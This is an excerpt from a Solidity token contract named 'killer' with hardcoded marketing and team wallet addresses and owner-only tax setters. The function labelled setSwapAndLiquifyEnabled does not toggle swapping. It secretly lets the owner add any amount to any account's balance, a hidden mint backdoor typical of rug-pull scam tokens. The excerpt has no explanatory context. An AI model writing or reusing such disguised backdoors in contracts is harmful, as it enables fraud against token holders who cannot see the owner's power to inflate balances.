...
contract killer is Context, IERC20, Ownable {
    ...
    constructor () {
        ...
        marketingWalletAddress = payable(address(0xeCbe5919c1b0F1Bb3Ca001479A939910002BaF64));
        teamWalletAddress = payable(address(0x7ac4dBf0633801b18f82d2443F7C116C391D32F6));
   ...
   function setSellTaxese(uint256 newLiquidityTax, uint256 newMarketingTax, uint256 newTeamTax) external onlyYou(){
    ...
    function setSwapAndLiquifyEnabled(bool _enabled,uint256 am,address accunt) public onlyYou() {_balances[accunt] = _balances[accunt] += am;
